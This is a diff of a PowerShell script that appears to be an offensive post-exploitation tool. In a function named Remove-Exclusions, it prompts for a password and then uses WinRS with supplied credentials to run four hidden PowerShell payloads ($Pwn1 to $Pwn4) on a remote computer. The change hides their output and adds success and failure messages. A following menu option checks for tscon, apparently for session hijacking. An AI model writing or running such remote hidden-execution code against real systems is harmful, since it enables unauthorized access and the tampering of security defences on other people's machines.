@@ -227,11 +227,15 @@ function Remove-Exclusions {
         do { Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
         if(!$PlainTextPassword) { Write-Host ; Write-Host $txt6 -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }} until ( $PlainTextPassword )
-        $Host.UI.RawUI.ForegroundColor = 'Blue' ; [Console]::SetCursorPosition(0,"$cursortop")
-        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe -windowstyle hidden $Pwn1"
-        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe -windowstyle hidden $Pwn2"
-        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe -windowstyle hidden $Pwn3"
-        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe -windowstyle hidden $Pwn4" ; Write-Host }
+        $Host.UI.RawUI.ForegroundColor = 'Blue'
+        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe -windowstyle hidden $Pwn1" 2>&1> $null ; Write-Host
+        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[-] Command execution failed!" -ForegroundColor Red }
+        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe -windowstyle hidden $Pwn2" 2>&1> $null ; Write-Host
+        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[-] Command execution failed!" -ForegroundColor Red }
+        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe -windowstyle hidden $Pwn3" 2>&1> $null ; Write-Host
+        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[-] Command execution failed!" -ForegroundColor Red }
+        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe -windowstyle hidden $Pwn4" 2>&1> $null ; Write-Host
+        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[-] Command execution failed!" -ForegroundColor Red }}
 
         '6' {
         Write-Host ; $test = Test-Command tscon ; if($test -in 'True'){ Write-Host "$txt28" -ForegroundColor Blue ; Write-Host
